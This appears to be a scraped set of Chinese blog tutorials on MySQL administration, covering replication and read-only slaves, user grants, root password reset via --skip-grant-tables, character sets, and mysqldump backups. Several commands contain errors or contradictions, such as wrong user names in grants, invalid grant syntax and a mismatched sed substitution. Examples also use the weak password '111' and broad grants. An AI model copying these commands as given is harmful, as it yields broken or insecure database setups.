show full processlist 命令找出执行时间长的查询语句或者大的事务。\n问题四：主从复制的设计问题\n例如，主从复制单线程，如果主库写并发太大，来不及传送到从库就会导致延迟，更高版本的MySQL可以支持多线程复制(MySQL5.6 Mariadb10.0)，门户网站则会自己开发多线程同步功能。\n问题五：主从之间的网络延迟\n主从库的网卡，网线，链接的交换机等网络设备都可能成为复制的瓶颈，导致复制延迟。另外，跨公网主从复制很容易导致主从复制延迟。\n问题六：主库读写压力大，导致复制延迟\n主库的硬件要搞好一些，架构的前端要加buffer以及缓存层。\n通过read-only让主库只读访问 read-only参数选项可以让出服务器只允许来自从服务器线程或具有SUPER权限的数据库用户进行更新。可以确保从服务器不接受来自用户端的非法用户更新。\nread-only参数允许数据库更新的条件为：\n具有SUPER权限的用户可以更新，不收read-only参数影响。例如：管理员root（注：工作中用户连接的账号授权不要给all，这样可以防止用户写数据） 来自从服务器线程可以更新，不收read-only参数影响，例如，前文的rep用户，在生产环境中，可以再从库Slave中使用read-only参数，确保从库数据不被非法更新。 read-only参数配置方法如下 方法一：启动数据库时直接带\u0026ndash;read-only参数启动或重启使用\nkillall mysqld mysqladmin -uroot -p111 -S /data/3307/mysql.sock shutdown mysqld_safe --defaults-file=/data/3307/my.cnf --read-only \u0026amp; 方法二：在my.cnf中[mysqld]模块下加read-only参数，然后重启数据库，配置如下\n[mysqld] read-only Web用户专业设置方案：MySQL主从复制读写分离集群 专业的运维人员提供给开发人员的读写分离账户设置方法如下：\n访问主库和从库使用一套用户密码，例如：用户为web，密码为111 即使访问IP不同，端口也尽量相同（3306）。例如：写库VIP为10.0.0.7，读库VIP10.0.0.8。 除了IP没办法修改之外，要尽量为开发人员提供方便，如果是数据库前段有DAL层（dbproxy），还可以只给开发人员一套用户、密码、IP、端口，这样就更专业了，剩下的都由鱼尾人员搞定。\n下面是授权web连接用户访问的方案：MySQL主从复制读写分离集群。\n方法1：从库和主库使用不同的用户，授权不同的权限\n主库上对web_m用户授权\n用户：web_m，密码：111 端口：3306 主库VIP：10.0.0.7\n权限：select insert update delete\n命令：grant select,insert,update,delete on web.* to web_m@10.0.0.% identified by '111'\n主库上对web_s用户授权\n用户：web_s，密码：111 端口：3306 主库VIP：10.0.0.8\n权限：select\n命令：grant select on web.* to web_m@10.0.0.% identified by '111'\n提示：此方法不够专业，但是可以满足开发需求\n方法2：主库和从库使用相同的用户，但授予不同的权限\n主库上对web用户授权\n用户：web密码：111 端口：3306 主库VIP：10.0.0.7 权限：select insert update delete 命令：grant select,insert,update,delete on web.* to web_m@10.0.0.% identified by '111' 从库上对web用户授权\n用户：web_m，密码：111 端口：3306 主库VIP：10.0.0.7 权限：select 命令：grant select on web.* to web_m@10.0.0.% identified by '111' 提示：由于主库和从库是同步复制的，所以从库上的web用户会自动和主库一致，即无法实现只读select权限\n要实现方法2中的授权方案，有两个方法\n在主库上创建完用户和权限，从库上revoke收回对应更新权限（insert,update,delete）。 revoke insert,update,delete on `web`.* from web@10.0.0.%; 忽略授权库mysql同步，主库的配置参数如下： binlog-ignore-db = mysql replicate-ignore-db = mysql # 参数两旁必须有空格 方法3：在从库上设置read-only参数，让从库只读\n从库主库：主库和从库使用相同的用户，授予相同的权限（非ALL权限）\n用户：web密码：111 端口：3306 主库VIP：10.0.0.7 权限：select insert update delete 命令：grant select,insert,update,delete on web.* to web_m@10.0.0.% identified by '111' 由于主库设置了read-only，非super权限是无法写入的，因此，通过read-only参数就可以很好的控制用户非法将数据写入从库。\n生产工作场景的设置方案如下：\n忽略主库mysql同步 主库和从库使用相同的用户，但授权不同的权限 在从库上设置read-only参数，让从库只读。 ","permalink":"https://www.oomkill.com/2017/05/ch6-mysql-replication/","summary":"","title":"ch06 - MySQL主从复制"},{"content":"设置MySQL管理员账号密码 在安装MySQL数据库后，MySQL管理员的账号root密码默认为空，极不安全\n启动修改丢失的MySQL单实例root密码方法\n停止MySQL\n/etc/init.d/mysqld stop 使用 \u0026ndash;skip-grant-tables启动mysql，忽略授权登陆验证\n# 单实例 /app/mysql/bin/mysqld_safe --skip-grant-tables --user=mysql # 多实例 /app/mysql/bin/mysqld_safe --defaults-file=/data/3306/my.cnf --user=mysql --skip-grant-tables \u0026amp; # 登录时空密码 $ mysql -S /data/3306/mysql.sock ... ... Welcome to the MySQL monitor. Commands end with ; or \\g. # 在启动时加 --skip-grant-tables参数，表示忽略授权 修改root密码为新密码\nmysql\u0026gt; set password=password('123'); ERROR 1290 (HY000): The MySQL server is running with the --skip-grant-tables option so it cannot execute this statement mysql\u0026gt; update mysql.user set password=password('123') where user='root'; Query OK, 4 rows affected (0.00 sec) Rows matched: 4 Changed: 4 Warnings: 0 mysql\u0026gt; flush privileges; 重启服务再登陆\n# 此时发现用原密码不能登陆mysql了 $ mysql -uroot -S /data/3306/mysql.sock ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO) $ mysql -uroot -S /data/3306/mysql.sock -p111 ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES) $ mysql -uroot -S /data/3306/mysql.sock -p123 Welcome to the MySQL monitor. Commands end with ; or \\g. 提示：启动时加 --skip-grant-tables 参数启动登陆修改完密码后一定要重启再对外提供服务，skip一定要放到后面\n清理无用的MySQL用户与库 清理无用的库\nmysql\u0026gt; show databases; +---------------------+ | Database | +---------------------+ | information_schema | | mysql | # 这个是mysql系统信息 | performance_schema | | test | # 这个相当于linux的/tmp，不用保留，直接删掉 +---------------------+ 语法：dorp user \u0026lsquo;user\u0026rsquo;@\u0026rsquo;host/ip\u0026rsquo; \u0026lt;= 注意引号，可以使单或双引号\nmysql\u0026gt; DROP USER 'root'@'::1'; mysql\u0026gt; FLUSH PRIVILEGES; 注意：如果drop删除不了（一般为特殊字符或大写），可以用下面方式删除（以root用户，oldboy主机为例）：\nDELETE FROM mysql.user WHERE user= 'root' AND host='oldboy'; flush privileges; 处理完用户必须执行 flush privileges\n创建MySQL用户及赋予用户权限 通过help查看grant命令帮助\nmysql\u0026gt; help grant Name: 'GRANT' Description: Syntax: GRANT priv_type [(column_list)] [, priv_type [(column_list)]] ... ON [object_type] priv_level TO user [auth_option] [, user [auth_option]] ... [REQUIRE {NONE | tls_option [[AND] tls_option] ...}] [WITH {GRANT OPTION | resource_option} ...] GRANT PROXY ON user TO user [, user] ... [WITH GRANT OPTION] .... .... CREATE USER 'jeffrey'@'localhost' IDENTIFIED BY 'mypass'; GRANT ALL ON db1.* TO 'jeffrey'@'localhost'; GRANT SELECT ON db2.invoice TO 'jeffrey'@'localhost'; GRANT USAGE ON *.* TO 'jeffrey'@'localhost' WITH MAX_QUERIES_PER_HOUR 90; 通过查看grant的命令帮助，可以很容易的找到创建用户并授权的例子。\n比较常见的创建用户的方法是，使用grant命令在创建用户的通同时进行授权。具体例子：\nGRANT ALL ON db1.* TO 'lc'@'localhost' IDENTIFIED BY '111'; 上述grant命令帮助里还提供了一个先用create命令创建用户，然后再用grant授权的方法，即创建用户和授权分开进行\nCREATE USER 'jeffrey'@'localhost' IDENTIFIED BY 'mypass';\t# 创建用户 useradd Jeffrey|passwd --stdin jeffrey GRANT ALL ON db1.* TO 'jeffrey'@'localhost'; # 对用户授权 通过grant命令创建用户并授权\ngrant all privileges on dbname.* to username@'localhost' identified by 'passwd' 列表说明如下\ngrant all privileges on dbname.* to username@localhost identified by \u0026lsquo;passwd\u0026rsquo; 授权命令 对应权限 目标：表和库 用户名和客户端主机 用户密码 说明：上述命令是授权localhost主机上通过用户username管理dbname数据库的所有权限，密码为passwd。其中username，dbname，passwd可根据业务的情况修改。\ncreate和grant配合法\n创建用户名username及密码passwd，授权主机localhost。\ncreate user 'username'@'localhost' identified by 'passwd'; 然后授权localhost主机上通过用户名username管理dbname数据库的所有权限，无需密码。\ngrant all on dbname.* to 'username'@'localhost'; 操作示例 案例1：创建oldboy用户，对zhangsan库具备所有权限，允许localhost主机登陆管理数据库，密码是oldboy123\n实现具体命令：\nGRANT ALL PRIVILEGES ON oldboy.* TO zhangsan@'localhost' IDENTIFIED BY '123'; 演示：\n# 查看当前数据库情况，然后执行对应命令授权如下： select user,host from mysql.user; # 查看zhangsan具体权限 show grants for zhangsan@'localhost'; 案例2：创建oldgirl用户，对test库具备所有权限，允许localhost主机登陆管理数据库的所有权限，无需密码\n查看当前数据库用户情况，然后执行命令创建用户\nmysql\u0026gt; select user,host from mysql.user; +----------+--------------+ | user | host | +----------+--------------+ | root | 127.0.0.1 | | zhangsan\t| 172.168.1.% | | root | localhost | | zhangsan\t| localhost | +----------+--------------+ 创建用户，指定密码，提示：仅仅是创建用户并未授权\ncreate user 'oldgirl'@'localhost'; grant all on test.* to 'oldgirl'@'localhost'; 查看授权后的MySQL用户列表情况\nmysql\u0026gt; show grants for 'oldgirl'@'localhost'; +-----------------------------------------------------------+ | Grants for oldgirl@localhost | +-----------------------------------------------------------+ | GRANT USAGE ON *.* TO 'oldgirl'@'localhost'\t| | GRANT ALL PRIVILEGES ON `test`.* TO 'oldgirl'@'localhost' | +-----------------------------------------------------------+ # 默认权限是usage，即连接的权限，因为此时还没有权限。 # 第二个表示对test库有所有权限 授权局域网内主机远程链接数据库 根据grant命令语法，知道test@\u0026rsquo;localhsot\u0026rsquo;位置为授权方位数据库的主机，localhost可以用域名，IP或IP段来代替，因此，要授权局域网内主机可以通过如下方法实现\n一条命令，“百分号” 匹配法\ngrant all on *.* to test@'10.0.0.%' identified by '111'; 一条命令，“子网掩码” 配置法\ngrant all on *.* to test@'10.0.0.0/255.255.255.0' identified by '111' # 子网掩码部分不要用24 两条命令实现\ncreate user test@'10.0.0.%' identified by '111' grant all on *.* to test@'10.0.0.%' 最后记得上述每条grant命令都要刷新权限\nflush privileges 提示：如果是web链接数据库的用户，尽量不要授权all，而是select,insert,update,delete\u0026hellip;.\n通过MySQL客户端链接异地数据库服务 本地 mysql -uroot -p111 连接相当于 mysql -uroot -p111 -hlocalhost\n要远程链接10.0.0.7的数据库，命令为 mysql -utest -p111 -h10.0.0.7，如果要能链接成功，还需要在10.0.0.7 的数据库服务器上通过如下命令授权：\ngrant all on *.* to test@'10.0.0.%'identified by '111' 用户可以授权的权限都有那些? 通过实验获得all privileges包括那些权限，\n先看看前面授权过的oldgirl的权限\nmysql\u0026gt; show grants for oldgirl@'localhost'; +-----------------------------------------------------------+ | Grants for oldgirl@localhost | +-----------------------------------------------------------+ | GRANT USAGE ON *.* TO 'oldgirl'@'localhost'\t| | GRANT ALL PRIVILEGES ON `test`.* TO 'oldgirl'@'localhost' | +-----------------------------------------------------------+ # 此时查看，还是all privileges权限，但并未细分 取消 oldgirl 的只读权限（SELECT）看看结果\nmysql\u0026gt; help revoke Name: 'REVOKE' Description: Syntax: REVOKE priv_type [(column_list)] [, priv_type [(column_list)]] ... ON [object_type] priv_level FROM user [, user] ... REVOKE ALL PRIVILEGES, GRANT OPTION FROM user [, user] ... REVOKE PROXY ON user FROM user [, user] ... .... .... REVOKE INSERT ON *.* FROM 'jeffrey'@'localhost'; .... .... # 通过help revoke可以看出删除一个权限的方法 使用revoke移除授权\nmysql\u0026gt; revoke SELECT on test.* from oldgirl@'localhost'; Query OK, 0 rows affected (0.00 sec) mysql\u0026gt; show grants for oldgirl@'localhost'; | Grants for oldgirl@localhost ---------------| GRANT USAGE ON *.* TO 'oldgirl'@'localhost'-------------------------- | GRANT INSERT, UPDATE, DELETE, CREATE, DROP, REFERENCES, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES, EXECUTE, CREATE VIEW, SHOW VIEW, CREATE ROUTINE, ALTER ROUTINE, EVENT, TRIGGER ON `test`.* TO 'oldgirl'@'localhost' | --------------------------------2 rows in set (0.01 sec)------------------------------ 此时我们再查看oldgirl用户权限，ALL PRIVILEGES权限已经被细分了，但是没有SELECT权限了。\n因此我们就可以得出结论：ALL PRIVILEGES包括\nSELECT INSERT UPDATE DELETE CREATE DROP REFERENCES INDEX ALTER CREATE TEMPORARY TABLES LOCK TABLES EXECUTE CREATE VIEW SHOW VIEW CREATE ROUTINE ALTER ROUTINE EVENT TRIGGER 在授权时，可以授权用户最小的满足业务需求的权限，而不是一味的授权“ALL PRIVILEGES”\n生产环境如何授权用户权限 博客 CMS等产品的数据库授权：\n对于web链接用户授权尽量采用最小化原则，很多开源软件都是web界面安装，因此，在安装期间处理select, insert, update, delete4个权限外，还需要 create drop 等比较危险的权限。\n常规情况下授权 select, insert, update, delete4个权限即可，有的开源软件，如 discuz cms还需要create drop等比较危险的权限。\n生成数据库表后，要收回create、drop权限\n生产环境针对主库（写为主读为辅）用户授权\n普通的环境：\n本机：lnmp，lamp环境数据库授权\ngrant all privileges on `blog`.* to blog@'localhost' identified by '111'; 应用服务器和数据库服务器不在一个主机上的授权：\ngrant all privileges on `blog`.* to blog@'10.0.0.1' identified by '111'; 严格的授权：重视安全，忽略了方便\ngrant SELECT,INSERT,UPDATE,DELETE privileges on `blog`.* to blog@'10.0.0.1' identified by '111'; 生产环境从库（只读）用户的授权：\ngrant SELECT privileges on `blog`.* to blog@'10.0.0.1' identified by '111'; 说明：这里表示给10.0.0.0/24的用户blog管理blog数据库的所有表（ * 表示所有表）只读权限（select），密码为111。\n生产场景授权具体命令为 主库授权的命令\ngrant select,insert,update,delete on `blog`.* to blog@'10.0.0.%' identified by '111'; 从库授权用户命令\ngrant SELECT on `blog`.* to blog@'localhost' identified by '111' 当然从库除了做SELECT授权外，还可以加read-only等只读参数，严格控制web用户写从库。\n重要问题：就是主从库的MySQL库和表是同步的，无法针对同一个用户授权不同的权限。应为，主库授权后会自动同步到从库上，导致从库的授权只读失败。\n解决方法：\n取消mysql库的同步。\n授权主库权限后，从库执行收回增删改权限。\n不在授权上控制增删改，而是用read-only参数，控制普通用户更新从库，注意，read-only参数对超级用户无效。\n查看MySQL数据库中的用户和主机信息\n查询授权用户oldboy的具体的授权权限\nmysql\u0026gt; show grants for root@'localhost'; +--------------------------------------------------------------------------+ | Grants for root@localhost | +--------------------------------------------------------------------------+ | GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' IDENTIFIED BY PASSWORD '*23AE809DDACAF96AF0FD78ED04B6A265E05AA257' WITH GRANT OPTION | | GRANT PROXY ON ''@'' TO 'root'@'localhost' WITH GRANT OPTION | +--------------------------------------------------------------------------+ ","permalink":"https://www.oomkill.com/2017/05/ch2-mysql-security/","summary":"","title":"ch02 - MySQL安全相关配置"},{"content":"MySQL数据库字符集介绍 简单来说，字符集就是一套文字符号及其编码、比较规则的集合，第一个计算机字符集ASCII！\nMySQL数据库字符集包括字符集(character)和校对规则(collation)两个概念。其中，字符集是用来定义MySQL数据字符串的存储方式。而校对规则则是定义比较字符串的方式。\n上面命令查看已建立的test数据库语句中 CHARACTER SET latin1即为数据库字符集，而COLLATE latin1_swedish_ci为校对规则，更多内容 见mysql手册第10章。\n编译MySQL时，指定字符集了，这样以后建库的时候就直接create database test;\n二进制安装MySQL，并没有指定字符集，这时字符集默认latin1，此时，需要建立UTF8字符集的库，就需要指定UTF8字符集建库。\ncreate database test1 default character set utf8 default collate=utf8_general_ci; MySQL常见字符集介绍 在互联网环境中，使用MySQL时常用的字符集有：\n常用字符集 一个汉字长度（字节） 说明 GBK 2 不是国际标准，对中文环境支持很好。 UTF8 3 中英文混合环境，建议使用此字符集，用的比较多的。 latin1 1 MySQL的默认字符集 utf8mb4 4 UTF8 Unicode，移动互联网 MySQL如何选择合适的字符集？ 如果处理各种各样的文字，发布到不同语言的国家地区，应选Unicode字符集，对MySQL来说就是utf-8（每个汉字三个字节），如果应用需处理英文，仅有少量汉字的utf-8更好。\n如果只需支持中文，并且数据两很大，性能要求也高，可选GBK（定长 每个汉字占双字节，英文也占双字节），如果需大量运算，比较排序等，定长字符集更快，性能\n处理移动互联网业务，可能需要使用utf8mb4字符集。\n如无特别需求，选择UTF8\n查看MySQL字符集 查看当前MySQL系统支持的字符集\nMySQL可支持多种字符集，同一台机器，库或表的不同字段都可以指定不同的字符集。\nmysql\u0026gt; show character set;\r+----------+-------------------------+---------------------+--------+\r| Charset | Description | Default collation | Maxlen |\r+----------+-------------------------+---------------------+--------+\r| latin1 | cp1252 West European | latin1_swedish_ci | 1 |\r| gbk | GBK Simplified Chinese | gbk_chinese_ci | 2 |\r| utf8 | UTF-8 Unicode | utf8_general_ci | 3 |\r| utf8mb4 | UTF-8 Unicode | utf8mb4_general_ci | 4 |\r+----------+-------------------------+---------------------+--------+\r查看MySQL当前的字符集设置情况\nmysql\u0026gt; show global variables like '%character_set%';\r+---------------------------+-----------------------------------+\r| Variable_name | Value |\r+---------------------------+-----------------------------------+\r| character_set_client | utf8 |\r| character_set_connection | utf8 |\r| character_set_database | utf8 |\r| character_set_filesystem | binary |\r| character_set_results | utf8 |\r| character_set_server | utf8 |\r| character_set_system | utf8 |\r| character_sets_dir | /app/mysql-5.5.54/share/charsets/ |\r+---------------------------+-----------------------------------+\r提示：默认情况下character_set_clientcharacter_set_connectioncharacter_set_results三者字符集和系统的字符集一致。即为\n# CentOS 6\r$ cat /etc/sysconfig/i18n LANG=\u0026quot;zh_CN.UTF-8\u0026quot;\rSYSFONT=\u0026quot;latarcyrheb-sun16\u0026quot;\r$ echo $LANG\rzh_CN.UTF-8\r# CentOS 7\r$ echo $LANG\ren_US.UTF-8\r$ cat /etc/locale.conf LANG=\u0026quot;en_US.UTF-8\u0026quot;\rMySQL插入中文数据乱码深度剖析 MySQL数据库默认设置的字符集是什么？ 1.查看MySQL默认情况下设置的字符集\nmysql\u0026gt; show global variables like '%character_set%';\r+-----------------------------+---------+\r| Variable_name | Value |\r+-----------------------------+---------+\r| character_set_client | utf8 | 客户端字符集\r| character_set_connection | utf8 | 客户端连接字符集\r| character_set_database | utf8 | 数据库字符集，配置文件指定或建库建表指定\r| character_set_filesystem | binary | 文件系统字符集\r| character_set_results | utf8 | 返回结果字符集\r| character_set_server | utf8 | 服务器字符集，配置文件指定或建库建表指定\r| character_set_system | utf8 | 系统字符集\r+-----------------------------+---------+\r执行set names gbk到底做了什么 无论Linux系统的字符集是gb2312还是utf8，默认情况插入的数据都是乱码\nmysql\u0026gt; show global variables like '%character_set%';\r+---------------------------+--------+\r| Variable_name | Value |\r+---------------------------+--------+\r| character_set_client | gbk | | character_set_connection | gbk | | character_set_database | utf8 | | character_set_filesystem | binary | | character_set_results | gbk | | character_set_server | utf8 | | character_set_system | utf8 | +---------------------------+--------+\r| 5 | 2 | 3 | 0000-00-00 00:00:00 | 小中僠（国） | 大中僠（国） 执行完set对应的字符集操作，再次插入数据乱码就不乱了（注：原有乱码数据不可恢复）\nmysql\u0026gt; select id,title,content from documents;\r+----+----------+--------------------------------------------------------+\r| id | title | content |\r+----+----------+--------------------------------------------------------+\r| 5 | 灏忎腑鍏\t| 澶т腑鍏 |\r| 6 | 小中共\t| |\r| 7 | 巨龙中国 | 大気汚染　超大国の苦闘 |\r| 8 | 巨龙中国 | 大気汚染　超大国の苦闘 ～ＰＭ２.５　沈黙を破る人々～ | \u0026lt;=字符集不对查询也乱码\r+----+----------+--------------------------------------------------------+\rset names 改变了如下字符串 character_set_client character_set_connection\rcharacter_set_results\r提示：set names gbk 就是把上面3个桉树改成了 latin1 。也就是说 character_set_client character_set_connection character_set_results 三者的字符集和默认会和linux系统的字符集一致，但是当在mysql中执行 set names charset 操作后，这三者都会改变为设置的字符集，但是命令修改是临时生效的\nset names gbk也可以用下面三个命令替代\nset character_set_client=gbk;\rset character_set_results=gbk;\rset character_set_connection=gbk;\r此文下回看到要了解下：http://blog.sina.com.cn/s/blog_7c35df9b010122ir.html\nMySQL命令参数 --default-character-set=latin1 在做什么？ 先查看MySQL的字符集 mysql -uroot -p111 -S /data/3306/mysql.sock -e 'show variables like \u0026quot;character_set%\u0026quot;'\r+---------------------------+---------+\r| Variable_name | Value |\r+---------------------------+---------+\r| character_set_client | utf8 | | character_set_connection | utf8 | | character_set_database | utf8 | | character_set_filesystem | binary | | character_set_results | utf8 | | character_set_server | utf8 | | character_set_system | utf8 | +---------------------------+---------+\r带参数\u0026ndash;default-character-set=latin1登录到MySQL中查看字符集 $ mysql -uroot -p111 -S /data/3306/mysql.sock --default-character=latin1\rmysql\u0026gt; show variables like '%character_set%';\r+---------------------------+---------+\r| Variable_name | Value |\r+---------------------------+---------+\r| character_set_client | latin1 | | character_set_connection | latin1 | | character_set_database | utf8 | | character_set_filesystem | binary | | character_set_results | latin1 | | character_set_server | utf8 | | character_set_system | utf8 | +---------------------------+---------+\r提示：和 set names latin1 作用一样，MySQL命令后面加字符集也是把上面3个参数改成了 latin1 。即 character_set_client ，character_set_connection，character_set_results 三者字符集，但是这个登录命令修改字符集也是临时生效的。\n确保MySQL数据库插入数据不乱码解决方案 统一MySQL数据库客户及服务端字符集 通常MySQL数据库下面几个字符集（客户端和服务端）统一成一个字符集，才能确保插入的中文数据可以正确输出。即 show variables like 'character_set%'; 结果中的字符集设置尽量统一。当然，linux系统的字符集也要尽可能和数据库字符集统一。\nshow variables like \u0026lsquo;character_set%\u0026rsquo;;\n其中 character_set_client，character_set_connection，character_set_results 默认情况下采用Linux系统字符集设置，人工登录数据库执行 set names latin1; 以及MySQL指定字符集登录操作，都是改变了MySQL客户端的client connection results 三个参数的字符集为 latin，从而解决了插入中文乱码的问题，这个操作可以通过改变my.cnf配置文件客户端模块的参数来改变，并且永久生效。\n通过修改my.cnf实现修改MySQL客户端的字符集，配置方法如下\n[client]\rdefault-character-set=latin1\r# 提示无需重启服务，退出重新登录生效，此参数相当于，登录后执行 set names latin1;\r# 特别注意：多实例的MySQL客户端默认读/etc/my.cnf，所以指定客户端字符集就在/etc/my.cnf\r更改MySQL服务端字符集参数 按如下要求更改my.cnf [mysqld]\rdefault-character-set=latin1 # 5.1\rcharacter-set-server=latin1 # 5.5\r强调：以上在[mysqld]下设置的参数会更改下面两个参数的字符集设置\ncharacter_set_database character_set_server\r编译时指定服务端字符集 -DDEFAULT_CHARSET=utf8 \\\r-DDEFAULT_COLLATION=utf*_general_ci \\\r-DEXTRA_CHARSETS=gbk,gb2312,utf8,ascii \\\r统一MySQL数据库客户服务端字符集总结 客户端字符集设置为 \u0026quot;set names utf8;\u0026quot;，这样可以确保插入后的中文，不会出现乱码，但是对执行 set names utf8; 前插入的中文无效，此命令临时生效。\n和设置客户端字符集 \u0026quot;set names utf8\u0026quot; 命令有相同作用的方法还有，MySQL命令指定utf8字符集参数登录，以及在my.cnf里更改参数实现。\n在MySQL的 my.cnf 配置文件里 [client] 模块下添加字符集配置，生效后，相当于命令行 \u0026quot;set names utf8;\u0026quot; 的效果，由于更改的是客户端、连接和返回结果3个字符集，因此无需重启服务就生效。\n在MySQL的 my.cnf 配置文件里 [mysqld] 模块下添加字符集配置，生效后，创建数据库和表默认都是这个设置的字符集MySQL5.5和5.1的服务端字符集参数有变化，具体为 character-set-server=utf8 参数适合5.5，default-character-set=utf8 参数适合5.1及以前版本。\n彻底解决MySQL数据库插入中文乱码方案 切记：字符集的不一致是数据库乱码的罪魁祸首。\n确保以下（客户端和服务端）字符集是一致的，当然，字符集的选择可以有多种。\n修改字客户端字符集\nset names gbk;\r[mysql]\r/app/mysql/bin/mysqlsafe --default-character\r建库建表的时候要指定和上述设置的字符集相同的字符集，以GBK字符集为例： create database test default character set gbk collate gbk_chinese_ci;\r在数据库中执行sql语句方法 尽量不在MySQL命令行直接插入数据。 可在MySQL中source执行sql文件。 sql文件用utf8没有签名。 开发程序的字符集 生产中如何更改MySQL数据库库表的字符集 数据库字符集修改步骤 对于已有的数据库想修改字符集不能直接通过 \u0026quot;alter database character set *\u0026quot; 或 \u0026quot;alter TableName character set *\u0026quot;，这两个命令都没有更新已有数据的字符集，而只是对新创建的表或者数据生效。\n已有数据的字符集调整，必须先将数据导出，经过修改字符集后重新导入后才可完成。\n步骤如下：\n1. 导出表结构\nmysqldump -uroot -p --default-character-set=latin1 -d dbname\u0026gt;table.sql\r2. 编辑表结构语句alltable.sql将所有latin1字符串改成utf8;\nmysqldump -uroot -p111 -S /data/3306/mysql.sock --default-character-set=utf8 --compact -d test\u0026gt;table.sql\rsed -i 's#utf8#gbk#g' table.sql\r3.确保数据不在更新，导出所有数据（不带表结构）\nmysqldump -uroot -p111 \\\r--S/data/3306/mysql.sock \\\r--quick --no-create-info \\\r--extended-insert \\\r--default-character-set=utf8 参数说明\n--quick：用于转储大的表，强制mysqldump从服务器一次一行的检索数据而不是检索所有的行，并输出前cache到内存中。\n--no-create-info：不创建create table语句\n--extended-insert：使用包括几个values列表的多行insert语句，这样文件更小,IO也小，导入数据时会非常快。\n--default-character-set=latin1 ：按照原有字符集导出数据，这样导出的文件中，所有中文都是可见的，不会保存成乱码\n4. 修改my.cnf配置调整客户端及服务端字符集，重启生效\n[client]\rdefault-character-set=latin1\r# 提示无需重启服务，退出重新登录生效，此参数相当于，登录后执行 set names latin1;\r# 特别注意：多实例的MySQL客户端默认读/etc/my.cnf，所以指定客户端字符集就在/etc/my.cnf\r[mysqld]\rdefault-character-set=latin1 # 5.1\rcharacter-set-server=latin1 # 5.5\r5. 通过utf8建库\ncreate database test default character set utf8;\r6.导入表结构（更改过字符集的表结构）\nmysql -uroot -p111 -S /data/3306/mysql.sock dbname\u0026lt;table.sql\r7.导入数据\nmysql -uroot -p -S /data/3306/mysql.sock db\u0026lt;data.sql\r更改字符集思想\n数据库不要更新，导出所有数据。 把导出的数据进行字符集更换（替换表和库）。 修改my.cnf，更改MySQL客户端服务端字符集，重启生效 导入更改过字符集的数据，包括表结构语句，提供服务。 SSH客户端，以及程序更改为对应字符集 校对集collate collate指的是 字符之间的比较关系！\n校对集，依赖于字符集！\n校对集，指的是，在某个字符集下，字符的排序关系应该是什么，称之为校对集！\na B c or B a c\n此时，使用 order by对结果排序，看结果：顺序为 a-B-c 忽略了大小写！\nMariaDB [t_t]\u0026gt; select * from test order by name;\r+-----------+\r|name |\r+-----------+\r| a |\r| B |\r| c |\r+-----------+\r可以被 校对集改变：\n利用 show collation; 查看到所有的校对集！\nmysql\u0026gt; show collation;\r+---------------------+-----------+------+----------+-----------+---------+\r| Collation | Charset | Id | Default | Compiled | Sortlen |\r+---------------------+-----------+------+----------+-----------+---------+\r| latin1_bin | latin1 | 47 | | Yes | 1 |\r| latin1_general_ci | latin1 | 48 | | Yes | 1 |\r| gbk_chinese_ci | gbk | 28 | Yes | Yes | 1 |\r| utf8_general_ci | utf8 | 33 | Yes | Yes | 1 |\r+---------------------+-----------+------+----------+-----------+---------+\rci大小写不敏感的\n一个字符集下可以存在多个校对集，且有一个是默认的。\n再创建一个 utt8_bin的校对集表，在排序：\ncreate table t( name varchar(2) )engine innodb default charset=utf8 collate=utf8_bin;\rinsert into t values ('a'),('B'),('c');\rMariaDB [t_t]\u0026gt; select * from t order by name;\r+------+\r| name |\r+------+\r| B |\r| a |\r| c |\r+------+\r我们典型的选择：utf8_genreal_ci utf8_unicode_ci\n校验规则后缀说明： _bin 二进制编码层面直接比较\n_ci 忽略大小写（大小写不敏感）比较\n_cs 大小写敏感比较\n","permalink":"https://www.oomkill.com/2017/05/ch5-mysql-charset/","summary":"","title":"ch05 - MySQL字符集相关配置"},{"content":"备份数据库的意义 运维工作到底是什么工作，到底是做什么？\n运维工作简单的概括就两件事：\n一是保护公司的数据；二是网站7*24小时提供服务。\n那么对数据丢失一部分和网站7*24小时提供服务那个更重要呢？\n都很重要，只是说相比哪个更为重要？这个具体要看业务个公司。例如：银行、金融行业，数据是最重要的，一条都不能丢，可能宕机停机影响就没那么大。百度搜索，腾讯qq聊天记录丢失了几万条数据，都不算啥。\n对于数据来讲，数据最核心的就是数据库数据。\n备份单个数据库练习多种参数的使用 MySQL数据库自带了一个很好用的备份命令，就是mysqldump，它的基本使用如下：\nmysqldump -u UserName -p PassWord dbName \u0026gt; backName.sql\r备份库 mysqldump -S /data/3306/mysql.sock -uroot -p test\u0026gt;mysql.sql 检查备份结果\n$ egrep -v \u0026quot;#|\\*|--|^$\u0026quot; ./mysql.sql\rDROP TABLE IF EXISTS `test1`;\rCREATE TABLE `test1` (\r`id` int(10) unsigned NOT NULL AUTO_INCREMENT,\r`num1` varchar(20) NOT NULL,\r`num2` varchar(20) NOT NULL,\r`num3` varchar(20) NOT NULL,\r`num4` int(11) NOT NULL DEFAULT '0' COMMENT 'test1',\rPRIMARY KEY (`id`)\r) ENGINE=InnoDB AUTO_INCREMENT=2000001 DEFAULT CHARSET=utf8;\rLOCK TABLES `test1` WRITE;\rINSERT INTO `test1` VALUES (1,'1455577','9779520','4530868',0),\r注：因为导出时的格式没有加字符集，一般恢复到数据库里会正常，只是系统外查看不正常而已。另外，insert是批量插入的方式，这样在恢复时效率很高。\n根据查看的结果，我们看到了已备份的表结构语句及插入的数据整合的sql语句，但是中文数据乱码了。\n设置字符集参数备份解决乱码问题 查看备份前数据库客户端及服务器端的字符集设置\nmysql\u0026gt; show variables like \u0026quot;character%\u0026quot;\r+---------------------------+-----------------------------------+\r| Variable_name | Value |\r+---------------------------+-----------------------------------+\r| character_set_client | utf8 |\r| character_set_connection\t| utf8 |\r| character_set_database | utf8 |\r| character_set_filesystem\t| binary |\r| character_set_results | utf8 |\r| character_set_server | utf8 |\r| character_set_system | utf8 |\r| character_sets_dir | /app/mysql-5.5.54/share/charsets/ |\r+---------------------------+-----------------------------------+\r指定对应的字符集备份，这里为--default-character-set=utf8\nmysqldump -uroot -p111 --default-character-set=utf8 t1 \u0026gt; t.sql -S /data/3306/mysql.sock\r备份时加-B参数，增加创建库与选择库 -- Current Database: `t1`\rCREATE DATABASE /*!32312 IF NOT EXISTS*/ `t1` /*!40100| USE `t1`;\r优化配置文件大小减少输出注释（debug调试） 利用mysqldump的--compact参数优化下备份结果\n$ mysqldump 